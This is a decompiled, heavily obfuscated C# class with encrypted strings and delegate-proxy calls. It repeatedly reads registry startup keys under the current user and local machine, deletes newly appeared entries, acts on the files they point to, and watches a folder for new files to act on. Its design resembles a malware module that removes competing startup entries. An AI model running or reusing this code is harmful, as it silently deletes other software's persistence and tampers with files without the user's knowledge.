using System.Collections.Generic;
using System.IO;
using Microsoft.Win32;

internal class Class16
{
	private static List<string> list_0;

	private static List<string> list_1 = new List<string>();

	public static bool bool_0 = false;

	private static FileSystemWatcher fileSystemWatcher_0 = Delegate249.smethod_0();

	public static void smethod_0()
	{
		try
		{
			bool_0 = true;
			list_0 = Delegate75.smethod_1();
			Delegate242.smethod_0(fileSystemWatcher_0, Delegate59.smethod_0((string)_003CModule_003E.smethod_0(2188122648u)));
			Delegate243.smethod_0(fileSystemWatcher_0, NotifyFilters.DirectoryName);
			Delegate243.smethod_0(fileSystemWatcher_0, Delegate244.smethod_0(fileSystemWatcher_0) | NotifyFilters.FileName);
			Delegate243.smethod_0(fileSystemWatcher_0, Delegate244.smethod_0(fileSystemWatcher_0) | NotifyFilters.Attributes);
			Delegate245.smethod_0(fileSystemWatcher_0, smethod_2);
			Delegate246.smethod_0(fileSystemWatcher_0, bool_0: true);
		}
		catch
		{
		}
		while (bool_0)
		{
			try
			{
				string[] array = Delegate67.smethod_0(Delegate173.smethod_0(Registry.CurrentUser, (string)_003CModule_003E.smethod_0(2188122682u), bool_0: false));
				foreach (string text in array)
				{
					if (!list_0.Contains(text))
					{
						Delegate64.smethod_3(Delegate72.smethod_0((string)_003CModule_003E.smethod_0(2188121916u), Delegate59.smethod_1(Delegate71.smethod_0((string)_003CModule_003E.smethod_0(2188122835u), text)), (string)_003CModule_003E.smethod_0(2188122754u)), Delegate70.smethod_21());
						try
						{
							Delegate73.smethod_0(Delegate173.smethod_0(Registry.CurrentUser, (string)_003CModule_003E.smethod_0(2188122682u), bool_0: true), text);
							Delegate64.smethod_3(Delegate72.smethod_0((string)_003CModule_003E.smethod_0(2188121944u), Delegate59.smethod_1(Delegate71.smethod_0((string)_003CModule_003E.smethod_0(2188122835u), text)), (string)_003CModule_003E.smethod_0(2188122754u)), Delegate70.smethod_21());
							Delegate86.smethod_6(Delegate69.smethod_0(Delegate68.smethod_0(Delegate173.smethod_0(Registry.LocalMachine, (string)_003CModule_003E.smethod_0(2188122682u), bool_0: false), text)));
						}
						catch
						{
						}
						list_0.Add(text);
					}
				}
				string[] array2 = Delegate67.smethod_0(Delegate173.smethod_0(Registry.LocalMachine, (string)_003CModule_003E.smethod_0(2188122682u), bool_0: false));
				foreach (string text2 in array2)
				{
					if (!list_0.Contains(text2))
					{
						Delegate64.smethod_3(Delegate72.smethod_0((string)_003CModule_003E.smethod_0(2188121954u), Delegate59.smethod_1(Delegate71.smethod_0((string)_003CModule_003E.smethod_0(2188122835u), text2)), (string)_003CModule_003E.smethod_0(2188122754u)), Delegate70.smethod_21());
						try
						{
							Delegate73.smethod_0(Delegate173.smethod_0(Registry.LocalMachine, (string)_003CModule_003E.smethod_0(2188122682u), bool_0: true), text2);
							Delegate64.smethod_3(Delegate72.smethod_0((string)_003CModule_003E.smethod_0(2188121944u), Delegate59.smethod_1(Delegate71.smethod_0((string)_003CModule_003E.smethod_0(2188122835u), text2)), (string)_003CModule_003E.smethod_0(2188122754u)), Delegate70.smethod_21());
							Delegate86.smethod_6(Delegate69.smethod_0(Delegate68.smethod_0(Delegate173.smethod_0(Registry.LocalMachine, (string)_003CModule_003E.smethod_0(2188122682u), bool_0: false), text2)));
						}
						catch
						{
						}
						list_0.Add(text2);
					}
				}
			}
			catch
			{
			}
			Delegate82.smethod_2(3000);
		}
	}

	public static void smethod_1(string string_0)
	{
		Delegate64.smethod_3(Delegate72.smethod_0((string)_003CModule_003E.smethod_0(4284437612u), Delegate59.smethod_1(Delegate71.smethod_0((string)_003CModule_003E.smethod_0(4284438817u), string_0)), (string)_003CModule_003E.smethod_0(4284438896u)), Delegate70.smethod_21());
		if (!Delegate175.smethod_1(string_0))
		{
			return;
		}
		if (!list_1.Contains(string_0))
		{
			if (Delegate175.smethod_2(string_0))
			{
				Delegate64.smethod_3(Delegate72.smethod_0((string)_003CModule_003E.smethod_0(4284437598u), Delegate59.smethod_1(Delegate71.smethod_0((string)_003CModule_003E.smethod_0(4284438817u), string_0)), (string)_003CModule_003E.smethod_0(4284438896u)), Delegate70.smethod_21());
			}
			else
			{
				string string_ = Delegate72.smethod_0(Delegate59.smethod_4(string_0), (string)_003CModule_003E.smethod_0(4284437533u), Delegate103.smethod_0(5));
				if (Delegate63.smethod_2(string_0, string_))
				{
					Delegate64.smethod_3(Delegate80.smethod_0(new string[5]
					{
						(string)_003CModule_003E.smethod_0(4284437527u),
						Delegate59.smethod_1(Delegate71.smethod_0((string)_003CModule_003E.smethod_0(4284438817u), string_0)),
						(string)_003CModule_003E.smethod_0(4284438811u),
						Delegate59.smethod_1(Delegate71.smethod_0((string)_003CModule_003E.smethod_0(4284438817u), string_)),
						(string)_003CModule_003E.smethod_0(4284438896u)
					}), Delegate70.smethod_21());
				}
			}
		}
		list_1.Add(string_0);
	}

	public static void smethod_2(object sender, FileSystemEventArgs e)
	{
		if (bool_0)
		{
			WatcherChangeTypes watcherChangeTypes = Delegate247.smethod_0(e);
			if (watcherChangeTypes == WatcherChangeTypes.Created)
			{
				Delegate82.smethod_2(2000);
				Delegate86.smethod_6(Delegate248.smethod_0(e));
			}
		}
	}

	public static void smethod_3()
	{
		bool_0 = false;
	}

	private static List<string> smethod_4()
	{
		List<string> list = new List<string>();
		string[] array = Delegate67.smethod_0(Delegate173.smethod_0(Registry.CurrentUser, (string)_003CModule_003E.smethod_0(1530207560u), bool_0: false));
		foreach (string item in array)
		{
			if (!list.Contains(item))
			{
				list.Add(item);
			}
		}
		string[] array2 = Delegate67.smethod_0(Delegate173.smethod_0(Registry.LocalMachine, (string)_003CModule_003E.smethod_0(1530207560u), bool_0: false));
		foreach (string item2 in array2)
		{
			if (!list.Contains(item2))
			{
				list.Add(item2);
			}
		}
		return list;
	}
}
